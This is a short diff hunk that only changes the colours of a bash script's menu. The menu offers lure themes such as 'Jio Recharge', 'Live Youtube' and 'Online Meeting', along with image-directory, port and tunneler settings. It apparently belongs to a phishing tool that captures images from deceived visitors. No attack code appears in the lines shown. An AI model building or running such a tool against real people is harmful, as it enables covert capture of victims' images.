@@ -355,16 +355,16 @@ clear
 echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose an option:
-${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
-${cyan}[${white}2${cyan}] ${yellow}Festival
-${cyan}[${white}3${cyan}] ${yellow}Live Youtube
-${cyan}[${white}4${cyan}] ${yellow}Online Meeting
-${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
-${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
-${cyan}[${white}t${cyan}] ${yellow}Change Default Tunneler (current: ${red}${TN}${yellow})
-${cyan}[${white}x${cyan}] ${yellow}About
-${cyan}[${white}m${cyan}] ${yellow}More tools
-${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
+${red}[${white}1${red}] ${cyan}Jio Recharge
+${red}[${white}2${red}] ${cyan}Festival
+${red}[${white}3${red}] ${cyan}Live Youtube
+${red}[${white}4${red}] ${cyan}Online Meeting
+${red}[${white}d${red}] ${cyan}Change Image Directory (current: ${red}${FOL}${yellow})
+${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
+${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
+${red}[${white}x${red}] ${cyan}About
+${red}[${white}m${red}] ${cyan}More tools
+${red}[${white}0${red}] ${cyan}Exit${blue}
 "
 
 sleep 1
